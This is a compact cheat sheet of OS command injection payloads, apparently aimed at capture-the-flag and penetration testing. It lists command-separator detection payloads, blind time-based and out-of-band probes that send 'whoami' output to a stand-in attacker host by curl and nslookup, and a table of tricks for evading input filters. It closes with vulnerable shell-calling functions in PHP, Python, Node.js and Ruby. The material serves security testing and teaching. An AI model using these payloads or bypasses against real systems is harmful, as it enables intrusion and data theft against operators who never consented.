# OS Command Injection

## Detection Payloads
```
; id          | id          & id          && id
|| id         `id`         $(id)         %0aid
```

## Blind (No Output)
**Time**: `; sleep 5` | `& ping -c 5 127.0.0.1 &`
**OOB**: `; curl http://attacker/?$(whoami)` | `; nslookup $(whoami).attacker.com`

## Filter Bypass
| Filter | Bypass |
|---|---|
| Spaces | `${IFS}`, `{cmd,arg}`, `$'\x20'`, `%09` (tab), `<` |
| Command name | `/bin/c?t`, `c''at`, `c\at`, variable concat: `a=c;b=at;$a$b` |
| `cat` | `tac`, `head`, `tail`, `less`, `sort`, `xxd`, `base64`, `dd if=` |
| Alphanumeric only | `$'\150\145\154\154\157'` (octal), `$(printf '\x63\x61\x74')` |
| `/` | `${HOME:0:1}`, `${PATH:0:1}` |
| `flag` keyword | `f*`, `fl??`, `$(echo ZmxhZw==\|base64 -d)` |
| Length limit | Write file names char-by-char with `>`, then `sh *` |

## Language-Specific Sinks
| Language | Vulnerable Functions |
|---|---|
| PHP | `system()`, `exec()`, `passthru()`, `shell_exec()`, backticks |
| Python | `os.system()`, `subprocess.call(shell=True)` |
| Node.js | `child_process.exec()` (uses shell) — `execFile()` is safe |
| Ruby | `system()`, backticks, `exec()`, `%x()` |
